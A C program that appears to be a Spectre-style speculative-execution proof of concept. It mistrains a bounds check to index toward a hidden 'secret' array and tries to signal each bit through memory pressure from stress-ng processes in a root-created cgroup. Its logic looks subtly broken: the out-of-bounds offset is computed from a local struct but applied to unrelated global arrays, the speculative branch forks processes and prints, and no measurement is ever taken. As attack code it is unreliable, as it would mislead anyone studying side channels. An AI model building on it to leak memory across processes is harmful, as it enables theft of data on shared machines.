#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>

#define CGROUP_PATH "/sys/fs/cgroup/memory_stress1"
#define MEMORY_LIMIT "1G"
#define ARRAY_SIZE 16
#define SECRET_SIZE 16
#define TRAINING_ROUNDS 6

// Volatile for memory ordering and optimization prevention
volatile char array[ARRAY_SIZE];
volatile int array_size = ARRAY_SIZE;
volatile char secret[SECRET_SIZE];
volatile sig_atomic_t terminate_requested = 0;

pid_t stress_pids[2] = {0};

// Async-safe write
void safe_write(int fd, const char *msg) {
    ssize_t bytes_written = write(fd, msg, strlen(msg));
    (void)bytes_written; // Explicitly ignore return value but suppress warning
}


// Signal handler with proper cleanup
void handle_signal(int sig) {
    safe_write(STDERR_FILENO, "\nTermination signal received\n");
    terminate_requested = 1;
}

// Full cgroup cleanup
void cleanup_cgroup() {
    for (int i = 0; i < 2; i++) {
        if (stress_pids[i] > 0) {
            kill(stress_pids[i], SIGTERM);
            waitpid(stress_pids[i], NULL, 0);
            stress_pids[i] = 0;
        }
    }

    if (rmdir(CGROUP_PATH) == -1 && errno != ENOENT) {
        safe_write(STDERR_FILENO, "Failed to clean up cgroup\n");
    }
}

// Memory barrier
#define compiler_barrier() asm volatile("" ::: "memory")

void assign_to_cgroup(pid_t pid) {
    char path[256];
    snprintf(path, sizeof(path), "%s/cgroup.procs", CGROUP_PATH);

    int fd = open(path, O_WRONLY | O_APPEND);
    if (fd == -1) {
        perror("cgroup.procs open failed");
        exit(EXIT_FAILURE);
    }

    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d\n", pid);
    ssize_t written = write(fd, pid_str, strlen(pid_str));
    if (written == -1) {
        perror("Failed to write PID to cgroup");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
}

void create_cgroup() {
    if (mkdir(CGROUP_PATH, 0755) && errno != EEXIST) {
        perror("cgroup creation failed");
        exit(EXIT_FAILURE);
    }
}

void configure_cgroup() {
    // Enable memory controller
    int fd = open("/sys/fs/cgroup/cgroup.subtree_control", O_WRONLY | O_APPEND);
    if (fd == -1) {
        perror("subtree_control failed");
        exit(EXIT_FAILURE);
    }

    ssize_t written = write(fd, "+memory\n", 8);
    if (written != 8) {
        perror("Failed to enable memory controller");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);

    // Set memory limit
    char limit_path[256];
    snprintf(limit_path, sizeof(limit_path), "%s/memory.max", CGROUP_PATH);
    fd = open(limit_path, O_WRONLY);
    if (fd == -1) {
        perror("memory.max open failed");
        exit(EXIT_FAILURE);
    }

    const char *limit = MEMORY_LIMIT "\n";
    written = write(fd, limit, strlen(limit));
    if (written != (ssize_t)strlen(limit)) {
        perror("Failed to set memory limit");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
}

pid_t run_stress(int mb, int psi_mode) {
    char mem_str[32];
    snprintf(mem_str, sizeof(mem_str), "%dM", mb);

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        if (psi_mode) {
            execlp("stress-ng", "stress-ng", "--vm-bytes", mem_str,
                   "--vm-keep", "-m", "1", "--timeout", "10", NULL);
        } else {
            execlp("stress-ng", "stress-ng", "--vm-bytes", mem_str,
                   "--vm-keep", "-m", "1", NULL);
        }
        _exit(EXIT_FAILURE);
    }

    assign_to_cgroup(pid);
    return pid;
}

// Critical speculative execution code
__attribute__((noinline))
void victim_function(int x) {
    compiler_barrier();

    if (x < array_size) {
      printf("inside victim_function\n");
        // Waste cycles to extend speculation window
        for (volatile int i = 0; i < 100; i++) {}

        // Force speculative execution
        if (array[x]) {
            stress_pids[0] = run_stress(1, 0);
        } else {
            stress_pids[1] = run_stress(1024, 1);
        }
    }
    compiler_barrier();
}

void encode(int malicious_x, int train) {
    for (int j = TRAINING_ROUNDS - 1; j >= 0; j--) {
        // Original critical bit manipulation preserved
        int x = ((j % TRAINING_ROUNDS) - 1) & ~0xFFFF;
        x = (x | (x >> 16));
        x = train ^ (x & (malicious_x ^ train));

        victim_function(x);
    }
}

int main(int argc, char *argv[]) {
    struct sigaction sa;
    sa.sa_handler = handle_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    // Ensure memory layout
    struct {
        volatile char array[ARRAY_SIZE];
        volatile char secret[SECRET_SIZE];
    } __attribute__((packed)) memory_layout;

    // Initialize memory
    memset((void*)memory_layout.array, 1, ARRAY_SIZE); // All array elements = 1
    // Use actual 0s and 1s instead of ASCII characters
    uint8_t secret_bits[SECRET_SIZE] = {0,1,0,0,1,1,1,1,1,0,0,1,0,1,1,0};
    memcpy((void*)memory_layout.secret, secret_bits, SECRET_SIZE);

    // Validate input
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <offset 0-15>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *endptr;
    long offset = strtol(argv[1], &endptr, 10);
    if (*endptr || offset < 0 || offset >= SECRET_SIZE) {
        fprintf(stderr, "Invalid offset (0-15 required)\n");
        exit(EXIT_FAILURE);
    }

    // Calculate malicious index
    size_t array_base = (size_t)&memory_layout.array[0];
    size_t secret_base = (size_t)&memory_layout.secret[0];
    int malicious_x = (secret_base - array_base) + offset;

    // Setup cgroup
    create_cgroup();
    configure_cgroup();

    // Base stressor
    pid_t base_stress = run_stress(200, 0);

    // Prime system
    struct timespec delay = {.tv_sec = 1, .tv_nsec = 0};
    nanosleep(&delay, NULL);

    // Trigger speculation
    encode(malicious_x, 10);

    // Cleanup
    cleanup_cgroup();
    return EXIT_SUCCESS;
}